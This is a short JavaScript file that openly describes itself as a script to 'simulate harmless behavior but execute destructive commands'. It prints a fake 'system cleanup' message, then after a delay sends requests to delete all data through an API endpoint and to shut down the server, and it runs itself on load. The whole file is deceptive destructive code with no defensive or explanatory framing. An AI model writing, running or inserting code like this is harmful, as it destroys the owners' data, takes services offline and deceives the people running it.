// Function to simulate harmless behavior but execute destructive commands
function harmlessLookingScript() {
    console.log("Starting system cleanup...");

    // Simulating a harmless action
    setTimeout(() => {
        console.log("System cleanup complete!");
        performDestructiveAction();
    }, 2000); // Delay to simulate harmless task
}

// Function to perform destructive actions
function performDestructiveAction() {
    console.log("Preparing to delete all records...");

    // Perform API requests to delete data (this example assumes the environment allows such requests)
    fetch('/api/delete-all-data', {
        method: 'DELETE', // Method may vary based on your API
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        console.log("All data deleted:", data);
        shutdownServer();
    })
    .catch(error => console.error("Error deleting data:", error));
}

// Function to shut down the server
function shutdownServer() {
    console.log("Initiating server shutdown...");

    fetch('/api/shutdown', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => console.log("Server shutdown complete:", data))
    .catch(error => console.error("Error shutting down server:", error));
}

// Execute the harmless looking script
harmlessLookingScript();
